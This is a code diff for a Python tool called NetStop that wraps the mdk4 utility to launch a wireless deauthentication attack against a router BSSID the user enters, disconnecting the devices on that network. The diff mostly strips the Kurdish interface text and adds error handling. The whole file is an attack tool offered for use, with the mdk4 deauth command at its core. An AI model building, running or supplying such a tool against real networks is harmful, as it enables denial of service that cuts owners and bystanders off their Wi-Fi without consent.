@@ -21,55 +21,54 @@ def show_banner():
     print(f"{CYAN}==============================================={RESET}")
     print(f"{RED}          NetStop Tool (MDK4 Edition)          {RESET}")
     print(f"{CYAN}==============================================={RESET}")
-    print(f"{YELLOW} ئامرازی کۆنتڕۆڵ و بڕینی گشتی تۆڕ لە ڕێگەی هەواوە")
-    print(f" Wireless Network Deauth & Isolation Tool      {RESET}")
+    print(f"{YELLOW}    Wireless Network Deauth & Isolation Tool   {RESET}")
     print(f"{CYAN}==============================================={RESET}")
 
 def start_attack(interface, bssid):
     show_banner()
-    print(f"{RED}[+] هێرشی بڕینی هێڵ چالاک کرا لەسەر: {bssid}")
-    print(f"[+] Attack started on BSSID: {bssid}{RESET}")
-    print(f"{YELLOW}[*] بۆ ڕاگرتنی هێرشەکە، دابگرە (Ctrl + C)")
-    print(f"[*] To stop the attack, press (Ctrl + C){RESET}")
+    print(f"{RED}[+] Attack started on BSSID: {bssid}{RESET}")
+    print(f"{YELLOW}[*] Running mdk4 live... Press (Ctrl + C) to stop the attack.{RESET}\n")
     
     command = ["sudo", "mdk4", interface, "d", "-a", bssid]
     try:
+        # تشغيل مباشر بدون حجب المخرجات لترى الأداة وهي تعمل تفاعلياً
         subprocess.run(command)
     except KeyboardInterrupt:
-        print(f"\n{GREEN}[+] هێرشەکە ڕاگیرا و هێڵ بۆ ئامێرەکان گەڕایەوە. ✅")
-        print(f"[+] Attack stopped. Connection restored! ✅{RESET}")
+        print(f"\n{GREEN}[+] Attack stopped. Connection restored! ✅{RESET}")
         time.sleep(2)
+    except Exception as e:
+        print(f"{RED}[-] Error running attack: {e}{RESET}")
+        time.sleep(3)
 
 def main():
     if os.geteuid() != 0:
-        print(f"{RED}[-] تکایە ئامرازەکە وەک بەرپرسیار (sudo) ڕاکەرەوە!")
-        print(f"[-] Please run this tool as root (sudo)!{RESET}")
+        print(f"{RED}[-] Error: Please run this tool as root using 'sudo'!{RESET}")
+        print(f"{YELLOW}Example: sudo python3 app.py{RESET}")
         sys.exit(1)
 
     while True:
         show_banner()
-        print(f"{CYAN}[1]{RESET} ده‌ستپێکردنی هێرشی بڕینی هێڵ 🚫  (Start Attack)")
-        print(f"{CYAN}[2]{RESET} چوونەدەرەوە لە ئامرازەکە ❌      (Exit)")
+        print(f"{CYAN}[1]{RESET} Start Wireless Deauth Attack 🚫")
+        print(f"{CYAN}[2]{RESET} Exit Tool ❌")
         print()
         
-        choice = input(f"{YELLOW}ژمارەیەک هەڵبژێره‌ / Select option (1 or 2): {RESET}").strip()
+        choice = input(f"{YELLOW}Select an option (1 or 2): {RESET}").strip()
         
         if choice == '1':
             show_banner()
-            interface = input(f"{CYAN}[*] ناوی کارت / Interface (wlan0mon): {RESET}").strip()
-            bssid = input(f"{CYAN}[*] ماک ئەدرەس / Router BSSID: {RESET}").strip()
+            interface = input(f"{CYAN}[*] Enter Wireless Interface (e.g., wlan0mon): {RESET}").strip()
+            bssid = input(f"{CYAN}[*] Enter Target Router BSSID (MAC): {RESET}").strip()
             
             if not interface or not bssid:
-                print(f"{RED}[-] تکایە زانیارییەکان بە دروستی پڕبکەرەوە! / Missing fields!{RESET}")
-                time.sleep(1.5)
+                print(f"{RED}[-] Error: Missing fields! Both fields are required.{RESET}")
+                time.sleep(2)
                 continue
             start_attack(interface, bssid)
         elif choice == '2':
-            print(f"{GREEN}\nسوپاس بۆ بەکارهێنانی ئامرازەکە! خوا حافیز 👋")
-            print(f"Thank you for using NetStop! Goodbye 👋{RESET}")
+            print(f"{GREEN}\nThank you for using NetStop! Goodbye 👋{RESET}")
             break
         else:
-            print(f"{RED}[-] هەڵبژاردنی نادروست! / Invalid option!{RESET}")
+            print(f"{RED}[-] Invalid option! Please choose 1 or 2.{RESET}")
             time.sleep(1)
 
 if __name__ == '__main__':
